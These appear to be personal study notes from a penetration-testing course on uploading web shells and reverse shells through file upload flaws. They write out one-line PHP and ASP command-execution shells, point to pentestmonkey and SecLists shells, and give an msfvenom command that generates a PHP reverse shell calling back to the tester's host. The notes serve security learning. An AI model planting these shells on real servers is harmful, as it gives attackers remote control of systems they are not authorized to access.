Once we upload our malicious script and visit its link, **we should be able to interact with it to take control over the back-end server.**

# Web Shells
---
- One good option for `PHP` is **[phpbash](https://github.com/Arrexel/phpbash), which provides a terminal-like, semi-interactive web shell.**
- Furthermore, **==[SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) provides a plethora of web shells for different frameworks and languages==**, which can be found in the `/usr/share/seclists/Web-Shells` directory.
- For example, let's try to **upload `phpbash.php` from [phpbash](https://github.com/Arrexel/phpbash)** to our web application, **and then navigate to its link by clicking on the Download button:**
	- ![[Pasted image 20251107003048.png]]

# Writing Custom Web Shell
---
- This is because we **may not have access to online tools during some penetration tests,** so we need to be able to create one when needed.
- For example, **==with `PHP` web applications, we can use the `system()` function==** that executes system commands and prints their output, and **pass it the `cmd` parameter with `$_REQUEST['cmd']`, as follows:**
	- `<?php system($_REQUEST['cmd']); ?>`

- If we write the above script to `shell.php` and **upload it to our web application, we can execute system commands with the `?cmd=` GET parameter** (e.g. `?cmd=id`), as follows:
	- ![[Pasted image 20251107003137.png]]
- **Tip:** If we are using this custom web shell in a browser, it may be **best to use source-view by clicking `[CTRL+U]`, as the source-view** shows the command output as it would be shown in the terminal, **without any HTML rendering that may affect how the output is formatted.**

- For **`.NET` web applications, we can pass the `cmd` parameter** with **`request('cmd')` to the `eval()` function**, and it should also execute the command specified in `?cmd=` and print its output, as follows:
	- `<% eval request('cmd') %>`

- We can find various other **web shells online**, many of which can be **easily memorized for web penetration testing purposes.**
- must be noted that **`in certain cases, web shells may not work`.**
- This may be due to the **web server preventing the use of some functions utilized by the web shell (e.g. `system()`), or due to a Web Application Firewall,** among other reasons.

# Reverse Shell
---
- One reliable reverse shell for **==`PHP` is the [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) PHP reverse shell.==** 
- Furthermore, **==the same [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) we mentioned earlier also contains reverse shell scripts for various languages==** and web frameworks, and we can utilize any of them to receive a reverse shell as well.
- For the `pentestmonkey` script, we can modify lines `49` and `50` and input our machine's IP/PORT:
	- ![[Pasted image 20251107004051.png]]

- Next, **we can start a `netcat` listener on our machine** (with the above port), upload our script to the web application, **and then visit its link to execute the script and get a reverse shell connection:**
	- ![[Pasted image 20251107004106.png]]

# Generating Custom Reverse Shell Scripts
---
- Tools like ==**`msfvenom` can generate a reverse shell script== in many languages and may even attempt to bypass certain restrictions** in place. We can do so as follows for `PHP`:
	- `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`

- Once our `reverse.php` script is generated, we can once again start a `netcat` listener on the port we specified above, upload the `reverse.php` script and visit its link, and we should receive a reverse shell as well:
	- ![[Pasted image 20251107004203.png]]
- We can **use many reverse shell payloads with the `-p` flag and specify the output language with the `-f` flag.**